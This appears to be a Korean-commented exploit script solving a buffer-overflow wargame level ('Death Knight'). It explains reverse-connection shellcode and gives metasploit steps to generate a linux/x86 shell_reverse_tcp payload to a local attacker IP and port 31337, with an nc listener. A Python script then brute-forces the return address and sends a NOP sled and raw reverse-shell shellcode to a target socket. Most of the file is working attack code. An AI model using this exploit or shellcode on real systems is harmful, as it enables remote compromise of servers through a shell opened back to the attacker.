'''

if (!fork())
{
         send(client_fd, "Death Knight : Not even death can save you from me!\n", 52, 0);
         send(client_fd, "You : ", 6, 0);
         recv(client_fd, buffer, 256, 0);
         close(client_fd);
         break;
}

buffer의 크기가 40인데 recv 함수에서 256을 받아 올 수 있으므로 
버퍼 오버플로우가 일어날 것 같이 생겼다.



* 리버스커넥션을 사용해보자.
 - 익스플로잇을 이용한 공격 대상은 주로 서버가 되는데, 대부분의 서버 앞에 방화벽이 있어서 포트는 개방이
  되어있어도 접근을 하지 못하는 경우가 생긴다. 이를 우회하기 위해 리버스 커넥션 쉘코드를 사용한다.
 
  ->리버스 커넥션이란? outbound 트래픽의 경우 대부분 방화벽에서 차단하지 않는다는 점을 이용하여
    타겟 시스템(내부망)에서 공격자의 PC(외부망)로 접속을 하도록 하는 기법.

- 리버스 커넥션 쉘코드 만드는 법(metasploit을 활용)
service postgresql start
msfconsole
search reverse_tcp
use payload/linux/x86/shell_reverse_tcp
show options
lhost 192.168.111.128 (자기 호스트)
lport 31337	      (연결을 받을 자기 포트)
generate (generate -b '\xff\x00')


- 연결 받을 서버 여는 법 (우분투에서 실행)
nc -l -v 31337


payload = buf[40] + sfp + ret + "\x90"*100 + reverse shell


'''


import sys,socket

TARGET_IP=sys.argv[1]
TARGET_PORT=int(sys.argv[2])

reversesh=""
reversesh+="\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
reversesh+="\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x6f"
reversesh+="\x81\x68\x02\x00\x7a\x69\x89\xe1\xb0\x66\x50\x51\x53\xb3"
reversesh+="\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
reversesh+="\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

for h in range(0xff,0x00,-1):
	for l in range(0x00,0x100,10):
		print('start')
		payload="a"*44+chr(l)+chr(h)+"\xff\xbf"
		payload+="\x90"*100
		payload+=reversesh
		print(payload)

		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((TARGET_IP,TARGET_PORT))
		a=s.recv(4096)
		print(a)
		s.send(payload)
		s.close()
		print('stop')



